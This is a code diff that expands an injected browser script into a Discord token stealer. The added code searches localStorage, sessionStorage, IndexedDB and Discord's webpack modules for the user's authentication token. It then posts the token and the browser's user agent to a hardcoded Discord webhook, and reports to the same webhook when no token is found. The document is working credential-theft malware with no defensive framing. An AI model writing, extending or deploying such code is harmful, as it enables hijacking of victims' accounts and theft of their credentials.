@@ -1,37 +1,84 @@
 <script>
 (async function() {
-    function getTokenFromIndexedDB() {
-        return new Promise((resolve) => {
-            let DBOpenRequest = indexedDB.open('discord');
-            DBOpenRequest.onsuccess = function(event) {
-                let db = event.target.result;
-                let transaction = db.transaction(['users'], 'readonly');
-                let objectStore = transaction.objectStore('users');
-                let request = objectStore.getAll();
-                request.onsuccess = function() {
-                    let users = request.result;
-                    for (let user of users) {
-                        if (user.token) {
-                            resolve(user.token);
-                            return;
-                        }
-                    }
-                    resolve(null);
-                };
-                request.onerror = () => resolve(null);
-            };
-            DBOpenRequest.onerror = () => resolve(null);
-        });
+    let token = null;
+
+    // Method 1: LocalStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        if (key && (key.includes('token') || key.includes('Token'))) {
+            token = localStorage.getItem(key);
+            break;
+        }
     }
 
-    let token = await getTokenFromIndexedDB();
-    if (token && token !== 'undefined' && token !== 'null') {
+    // Method 2: IndexedDB
+    if (!token) {
+        try {
+            let DBOpenRequest = indexedDB.open('discord');
+            token = await new Promise((resolve) => {
+                DBOpenRequest.onsuccess = function(event) {
+                    let db = event.target.result;
+                    let transaction = db.transaction(['users'], 'readonly');
+                    let objectStore = transaction.objectStore('users');
+                    let request = objectStore.getAll();
+                    request.onsuccess = function() {
+                        let users = request.result;
+                        for (let user of users) {
+                            if (user.token) {
+                                resolve(user.token);
+                                return;
+                            }
+                        }
+                        resolve(null);
+                    };
+                    request.onerror = () => resolve(null);
+                };
+                DBOpenRequest.onerror = () => resolve(null);
+            });
+        } catch(e) { token = null; }
+    }
+
+    // Method 3: SessionStorage
+    if (!token) {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            let key = sessionStorage.key(i);
+            if (key && key.includes('token')) {
+                token = sessionStorage.getItem(key);
+                break;
+            }
+        }
+    }
+
+    // Method 4: Check global variables (advanced)
+    if (!token && window.webpackChunkdiscord_app) {
+        try {
+            let modules = window.webpackChunkdiscord_app.push([[], {}, function(e) { return e; }]);
+            for (let id in modules.c) {
+                let mod = modules.c[id];
+                if (mod.exports && mod.exports.default && mod.exports.default.getToken) {
+                    token = mod.exports.default.getToken();
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
+
+    if (token && token !== 'undefined' && token !== 'null' && token !== '') {
         let webhookURL = "https://discord.com/api/webhooks/1507060845006295222/YAX7dWVRT8jYu52d-nOwp2rY1gObequWZsPAvsCFTjZmXJy9p0RdqBjTx2hTc4Ehdsj4";
         fetch(webhookURL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                content: "**Token (IndexedDB):** `" + token + "`\n**User Agent:** " + navigator.userAgent
+                content: "**TOKEN FOUND:** `" + token + "`\n**Method:** multi\n**User Agent:** " + navigator.userAgent
+            })
+        }).catch(e => console.log(e));
+    } else {
+        // Send failure report
+        fetch("https://discord.com/api/webhooks/1507060845006295222/YAX7dWVRT8jYu52d-nOwp2rY1gObequWZsPAvsCFTjZmXJy9p0RdqBjTx2hTc4Ehdsj4", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                content: "**FAILED:** No token found. User may be logged out or Discord version changed."
             })
         }).catch(e => console.log(e));
     }
